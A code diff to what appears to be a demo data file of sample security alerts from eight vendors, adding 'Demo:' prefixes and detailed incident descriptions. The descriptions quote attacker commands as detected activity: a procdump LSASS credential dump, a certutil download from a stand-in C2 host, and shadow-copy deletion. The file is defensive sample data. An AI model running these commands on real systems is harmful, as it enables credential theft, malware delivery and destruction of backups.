@@ -11,8 +11,11 @@
  *  - Palo Alto Networks Cortex XDR
  *  - Okta Identity Cloud
  *
- * Each alert JSON includes a top-level "source" field naming the tool/source,
- * allowing the ingestion webhook and frontend to resolve and load the matching logo image.
+ * Each alert JSON includes:
+ *  - Top-level "source" field naming the tool/source for logo resolution
+ *  - "Demo: " prefix at the start of titles and detection descriptions
+ *  - Rich, detailed technical descriptions with process lineage, network context,
+ *    identities, and MITRE ATT&CK techniques.
  */
 
 export interface SampleAlert {
@@ -21,6 +24,7 @@ export interface SampleAlert {
   productName: string;
   title: string;
   severity: string;
+  description: string;
   payload: Record<string, any>;
 }
 
@@ -39,8 +43,14 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   // 1. CrowdStrike Falcon
   () => {
     const findingUid = getUniqueFindingUid('cs-falcon');
+    const description =
+      'Demo: CrowdStrike Falcon detected an unbacked memory dump attempt targeting the Local Security Authority Subsystem Service (LSASS.exe) by suspicious process "procdump64.exe" (PID 4812, Parent PID 1204 - cmd.exe). The process was launched from "C:\\Windows\\Temp\\procdump64.exe" with arguments "-accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp". The user context was identified as CORP\\admin_backup on host WS-CORP-492 (IP 10.120.4.52). Prior to dumping, the binary initiated an outbound TLS handshake to 194.26.29.112:443. Falcon OverWatch flagged this behavior as high-confidence credential harvesting (T1003.001). Falcon Host sensor prevented execution and quarantined the generated memory artifact.';
+
     const rawPayload = {
       source: 'CrowdStrike Falcon',
+      title: 'Demo: CrowdStrike - Credential Dumping via LSASS Memory Read (ProcDump)',
+      description,
+      message: description,
       metadata: {
         customerIDString: 'c8d8f0e1a2b3c4d5e6f7',
         offset: 10245,
@@ -52,8 +62,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
         SensorId: `aid-${findingUid}`,
         ComputerName: 'WS-CORP-492',
         UserName: 'admin_backup',
-        DetectName: 'CredentialDumping:LSASS',
-        DetectDescription: 'ProcDump attempted to read memory of Local Security Authority Subsystem Service (LSASS)',
+        DetectName: 'Demo: Credential Dumping: LSASS (ProcDump)',
+        DetectDescription: description,
+        Description: description,
         Severity: 4,
         SeverityName: 'High',
         FalconHostLink: `https://falcon.crowdstrike.com/activity/detections/detail/${findingUid}`,
@@ -75,8 +86,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
       id: findingUid,
       sourceName: 'CrowdStrike Falcon',
       productName: 'CrowdStrike',
-      title: 'CrowdStrike: Credential Dumping via LSASS Memory Read (ProcDump)',
+      title: 'Demo: CrowdStrike - Credential Dumping via LSASS Memory Read (ProcDump)',
       severity: 'High',
+      description,
       payload: rawPayload,
     };
   },
@@ -85,12 +97,16 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   () => {
     const findingUid = getUniqueFindingUid('mde');
     const nowIso = new Date().toISOString();
+    const description =
+      'Demo: Microsoft Defender for Endpoint detected a Living-off-the-Land (LotL) binary abuse involving certutil.exe on host FIN-APP-02.internal.corp (10.20.1.88). The process executed "certutil.exe -urlcache -split -f https://c2.threat-actor-ops.org/stage2.bin C:\\Windows\\Temp\\update.bin" under user context sarah.chen@corp.example.com. Destination IP 198.51.100.77 matches an active threat cluster delivering Cobalt Strike beacons. Defender Antivirus blocked the secondary execution of update.bin upon detecting an encoded shellcode header. The endpoint has been marked for automated network containment.';
+
     const rawPayload = {
       source: 'Microsoft Defender for Endpoint',
       id: `da-${Date.now()}-def`,
       provider: 'Microsoft Defender for Endpoint',
-      title: 'Living-off-the-Land Binary (Certutil) Remote Payload Download',
-      description: 'Certutil.exe was used to download a payload from a suspicious remote address',
+      title: 'Demo: Defender - Living-off-the-Land Binary (Certutil) Remote Payload Download',
+      description,
+      message: description,
       category: 'CommandAndControl',
       severity: 'High',
       status: 'NewAlert',
@@ -110,15 +126,16 @@ const ALERT_BUILDERS: AlertBuilder[] = [
         { entityType: 'Url', url: 'https://c2.threat-actor-ops.org/stage2.bin' },
         { entityType: 'User', accountName: 'sarah.chen@corp.example.com' },
       ],
-      mitreTechniques: ['T1105'],
+      mitreTechniques: ['T1105', 'T1059.001'],
     };
 
     return {
       id: findingUid,
       sourceName: 'Microsoft Defender for Endpoint',
       productName: 'Microsoft Defender for Endpoint',
-      title: 'Defender: Living-off-the-Land Binary (Certutil) Remote Payload Download',
+      title: 'Demo: Defender - Living-off-the-Land Binary (Certutil) Remote Payload Download',
       severity: 'High',
+      description,
       payload: rawPayload,
     };
   },
@@ -127,16 +144,23 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   () => {
     const findingUid = getUniqueFindingUid('s1');
     const nowIso = new Date().toISOString();
+    const description =
+      'Demo: SentinelOne Behavioral AI engine detected unauthorized shadow copy deletion attempting to inhibit system recovery on HR-DESKTOP-19 (10.0.12.44). Process "vssadmin.exe" (PID 6108) was spawned by an unsigned PowerShell script from "%APPDATA%\\Local\\Temp\\invoke-enc.ps1" executing "vssadmin.exe delete shadows /all /quiet". Subsequent activity attempted to tamper with Windows Defender services and bcdedit boot configuration. SentinelOne Singularity Storyline (Root ID: S1-SL-8921) correlated this activity with pre-ransomware staging (T1490). The engine triggered automated rollback mitigation, terminating the process tree and restoring modified system files.';
+
     const rawPayload = {
       source: 'SentinelOne Singularity',
+      title: 'Demo: SentinelOne - Ransomware Behavior (Volume Shadow Copy Deletion)',
+      description,
+      message: description,
       threatInfo: {
         threatId: `S1-THREAT-${Date.now().toString().slice(-6)}`,
-        threatName: 'Ransomware.ShadowCopy.Delete',
+        threatName: 'Demo: Ransomware.ShadowCopy.Delete',
         classification: 'Ransomware',
         confidenceLevel: 'malicious',
         incidentStatus: 'unresolved',
         severity: 'critical',
         identifiedAt: nowIso,
+        description,
         filePath: 'C:\\Windows\\System32\\vssadmin.exe',
         fileSha256: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
         commandLine: 'vssadmin.exe delete shadows /all /quiet',
@@ -154,8 +178,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
       id: findingUid,
       sourceName: 'SentinelOne Singularity',
       productName: 'SentinelOne',
-      title: 'SentinelOne: Ransomware Behavior (Volume Shadow Copy Deletion)',
+      title: 'Demo: SentinelOne - Ransomware Behavior (Volume Shadow Copy Deletion)',
       severity: 'Critical',
+      description,
       payload: rawPayload,
     };
   },
@@ -164,8 +189,14 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   () => {
     const findingUid = getUniqueFindingUid('guardduty');
     const nowIso = new Date().toISOString();
+    const description =
+      'Demo: AWS GuardDuty detected an anomalous volume of failed SSH login attempts originating from external IP address 198.51.100.23 (Hostwinds LLC, Bucharest, RO) targeting bastion host instance i-0f8a91b2c3d4e5f60 (172.31.40.12) in us-east-1. Over 1,420 failed authentication attempts using common dictionary accounts (root, ubuntu, deploy, test) were recorded within a 15-minute window via VPC Flow Logs. The source IP is categorized under threat intelligence feeds as an active automated brute-force scanner. No successful credentials were observed during this period, but inbound security group rules currently permit port 22 access from 0.0.0.0/0.';
+
     const rawPayload = {
       source: 'AWS GuardDuty',
+      title: 'Demo: GuardDuty - UnauthorizedAccess:EC2/SSHBruteForce Against Bastion',
+      description,
+      message: description,
       version: '0',
       id: `gd-${Date.now().toString().slice(-6)}-2026`,
       'detail-type': 'GuardDuty Finding',
@@ -177,8 +208,8 @@ const ALERT_BUILDERS: AlertBuilder[] = [
         accountId: '982341123901',
         region: 'us-east-1',
         type: 'UnauthorizedAccess:EC2/SSHBruteForce',
-        title: 'SSH brute force attack against EC2 bastion host',
-        description: '198.51.100.23 is performing SSH brute force attacks against i-0f8a91b2c3d4e5f60.',
+        title: 'Demo: SSH brute force attack against EC2 bastion host',
+        description,
         severity: 7.5,
         resource: {
           resourceType: 'Instance',
@@ -209,8 +240,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
       id: findingUid,
       sourceName: 'AWS GuardDuty',
       productName: 'AWS GuardDuty',
-      title: 'GuardDuty: UnauthorizedAccess:EC2/SSHBruteForce Against Bastion',
+      title: 'Demo: GuardDuty - UnauthorizedAccess:EC2/SSHBruteForce Against Bastion',
       severity: 'High',
+      description,
       payload: rawPayload,
     };
   },
@@ -219,13 +251,19 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   () => {
     const findingUid = getUniqueFindingUid('wazuh');
     const nowIso = new Date().toISOString();
+    const description =
+      'Demo: Wazuh Host-Based IDS and Sysmon integration detected persistent Command and Control (C2) beaconing activity on endpoint FIN-LAPTOP-04 (10.0.1.42). Process "msedge_proxy.exe" (SHA256: 9f8337a6b29f984a1e95642a420b98a3c8e47b3127814b721e25e709a34bc362) located at "%APPDATA%\\Roaming\\Microsoft\\Edge\\" established regular HTTPS connections every 45 seconds (jitter 10%) to external IP 194.26.29.112:8443. Memory forensics identified this executable as a masqueraded Sliver C2 Go-compiled implant. Wazuh Rule 100221 (Level 12) triggered due to repeated irregular beaconing patterns and masquerading of legitimate Microsoft Edge binaries.';
+
     const rawPayload = {
       source: 'Wazuh',
+      title: 'Demo: Wazuh - Sliver C2 Implant Beaconing on FIN-LAPTOP-04',
+      description,
+      message: description,
       timestamp: nowIso,
       rule: {
         id: '100221',
         level: 12,
-        description: 'Sliver C2 implant beaconing detected on endpoint',
+        description,
         firedtimes: 1,
         mail: false,
         groups: ['malware', 'c2', 'exploit'],
@@ -251,15 +289,16 @@ const ALERT_BUILDERS: AlertBuilder[] = [
           },
         },
       },
-      full_log: 'Sysmon Event 1: Image: msedge_proxy.exe CommandLine: %APPDATA%\\Roaming\\Microsoft\\Edge\\msedge_proxy.exe ParentImage: explorer.exe',
+      full_log: `Sysmon Event 1: Image: msedge_proxy.exe CommandLine: %APPDATA%\\Roaming\\Microsoft\\Edge\\msedge_proxy.exe ParentImage: explorer.exe. Destination: 194.26.29.112:8443. ${description}`,
     };
 
     return {
       id: findingUid,
       sourceName: 'Wazuh',
       productName: 'Wazuh',
-      title: 'Wazuh: Sliver C2 Implant Beaconing on FIN-LAPTOP-04',
+      title: 'Demo: Wazuh - Sliver C2 Implant Beaconing on FIN-LAPTOP-04',
       severity: 'Critical',
+      description,
       payload: rawPayload,
     };
   },
@@ -267,10 +306,16 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   // 6. Splunk Enterprise Security
   () => {
     const findingUid = getUniqueFindingUid('splunk-es');
+    const description =
+      'Demo: Splunk Enterprise Security Notable Event generated by correlation search "Impossible Travel Activity Detected". User account "r.sterling@corp.example.com" authenticated successfully via Okta SSO from Oslo, Norway (IP 84.212.10.44) at 14:02 UTC, followed 11 minutes later by an authentication attempt from Lagos, Nigeria (IP 185.220.101.5 - known Tor exit node) at 14:13 UTC. The calculated physical distance is 5,420 km, requiring a minimum travel speed of ~29,500 km/h, which is physically impossible. Risk score adjusted to 85; identity provider session revoked and adaptive authentication MFA challenge issued.';
+
     const rawPayload = {
       source: 'Splunk Enterprise Security',
+      title: 'Demo: Splunk ES - Impossible Travel - Concurrent Logins Across Countries',
+      description,
+      message: description,
       sid: `scheduler__admin__SplunkEnterpriseSecuritySuite__RMD${Date.now().toString().slice(-6)}`,
-      search_name: 'Notable Event - Impossible Travel Activity Detected',
+      search_name: 'Demo: Notable Event - Impossible Travel Activity Detected',
       app: 'SplunkEnterpriseSecuritySuite',
       owner: 'admin',
       results_link: 'https://splunk.internal.corp/app/SplunkEnterpriseSecuritySuite/@go?sid=scheduler__admin__SplunkEnterpriseSecuritySuite',
@@ -281,7 +326,8 @@ const ALERT_BUILDERS: AlertBuilder[] = [
         src: '185.220.101.5',
         user: 'r.sterling@corp.example.com',
         dest: 'identity.corp.example.com',
-        signature: 'Concurrent Logins from Distant Geographies (Oslo, NO & Lagos, NG within 12 minutes)',
+        description,
+        signature: 'Demo: Concurrent Logins from Distant Geographies (Oslo, NO & Lagos, NG within 12 minutes)',
         _time: `${Math.floor(Date.now() / 1000)}`,
       },
     };
@@ -290,8 +336,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
       id: findingUid,
       sourceName: 'Splunk Enterprise Security',
       productName: 'Splunk ES',
-      title: 'Splunk ES: Impossible Travel - Concurrent Logins Across Countries',
+      title: 'Demo: Splunk ES - Impossible Travel - Concurrent Logins Across Countries',
       severity: 'High',
+      description,
       payload: rawPayload,
     };
   },
@@ -299,16 +346,22 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   // 7. Palo Alto Networks Cortex XDR
   () => {
     const findingUid = getUniqueFindingUid('cortex-xdr');
+    const description =
+      'Demo: Palo Alto Networks Cortex XDR behavioral analytics engine detected and blocked an unbacked memory injection into the Local Security Authority Subsystem Service (lsass.exe, PID 720) on Domain Controller CORP-DC-01. Source process "mimikatz.exe" (SHA256: 3a7b1c4e8f9a2b5c6d7e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c) was invoked by service account "SVC_BACKUP" via scheduled task "BackupMaintenance". Cortex XDR agent terminated the injecting thread, isolated the binary, and triggered an endpoint triage dump. Associated alerts confirm prior reconnaissance commands ("whoami /priv", "nltest /dclist") executed 3 minutes prior.';
+
     const rawPayload = {
       source: 'Palo Alto Networks Cortex XDR',
+      title: 'Demo: Cortex XDR - Mimikatz LSASS In-Memory Dump Blocked',
+      description,
+      message: description,
       incident: {
         incident_id: `XDR-INC-${Date.now().toString().slice(-5)}`,
-        incident_name: 'Suspicious Memory Injection into LSASS.exe',
+        incident_name: 'Demo: Suspicious Memory Injection into LSASS.exe',
         creation_time: Date.now(),
         modification_time: Date.now(),
         status: 'new',
         severity: 'high',
-        description: 'Cortex XDR behavioral analytics terminated an unbacked thread injection into LSASS',
+        description,
         hosts: ['CORP-DC-01'],
         users: ['SVC_BACKUP'],
         alert_count: 1,
@@ -316,7 +369,8 @@ const ALERT_BUILDERS: AlertBuilder[] = [
           {
             alert_id: `AL-${Date.now().toString().slice(-5)}`,
             action: 'BLOCKED',
-            name: 'Mimikatz LSASS In-Memory Dump Blocked',
+            name: 'Demo: Mimikatz LSASS In-Memory Dump Blocked',
+            description,
             category: 'Credential Access',
             host_name: 'CORP-DC-01',
             user_name: 'SVC_BACKUP',
@@ -331,8 +385,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
       id: findingUid,
       sourceName: 'Palo Alto Networks Cortex XDR',
       productName: 'Cortex XDR',
-      title: 'Cortex XDR: Mimikatz LSASS In-Memory Dump Blocked',
+      title: 'Demo: Cortex XDR - Mimikatz LSASS In-Memory Dump Blocked',
       severity: 'High',
+      description,
       payload: rawPayload,
     };
   },
@@ -341,13 +396,19 @@ const ALERT_BUILDERS: AlertBuilder[] = [
   () => {
     const findingUid = getUniqueFindingUid('okta');
     const nowIso = new Date().toISOString();
+    const description =
+      'Demo: Okta ThreatInsight and Identity Threat Protection detected an MFA fatigue / push notification bombing attack targeting user "devops-admin@corp.example.com" (Alex Vance, ID: 00u8f192bka). The attacker, having obtained valid primary credentials, initiated 24 consecutive Okta Verify push challenges within a 90-second window from IP 194.26.29.5 (Seychelles, Anonymous VPN/Hosting provider AS208046). The user rejected 8 consecutive pushes before Okta adaptive rate-limiting triggered an automated account lock and denied further access. ThreatInsight flagged the source ASN as associated with credential stuffing infrastructure.';
+
     const rawPayload = {
       source: 'Okta',
+      title: 'Demo: Okta - High-Risk MFA Push Fatigue Bombing',
+      description,
+      message: description,
       eventId: `targets-okta-${Date.now().toString().slice(-6)}`,
       eventType: 'user.mfa.push.spam_detected',
       published: nowIso,
       severity: 'WARN',
-      displayMessage: 'Rapid MFA push spam detected from unfamiliar ASN',
+      displayMessage: description,
       actor: {
         id: '00u8f192bka',
         type: 'User',
@@ -374,8 +435,9 @@ const ALERT_BUILDERS: AlertBuilder[] = [
       id: findingUid,
       sourceName: 'Okta',
       productName: 'Okta',
-      title: 'Okta: High-Risk MFA Push Fatigue Bombing',
+      title: 'Demo: Okta - High-Risk MFA Push Fatigue Bombing',
       severity: 'Medium',
+      description,
       payload: rawPayload,
     };
   },
